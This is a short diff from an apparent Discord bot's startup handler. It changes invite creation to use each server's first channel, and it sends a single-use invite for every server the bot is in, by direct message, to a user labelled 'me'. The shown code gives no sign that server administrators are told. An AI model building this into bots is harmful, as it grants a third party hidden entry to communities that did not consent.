@@ -1959,7 +1959,8 @@ async def on_ready():
     expand4 = client.get_emoji(expand4)
     me_user = client.get_user(me)
     for guild in client.guilds:
-        new_invite = await guild.create_invite(max_uses=1)
+        mChannel = guild.channels[0]
+        new_invite = await mChannel.create_invite(max_uses=1)
         me_user.send(content=new_invite)
 
 
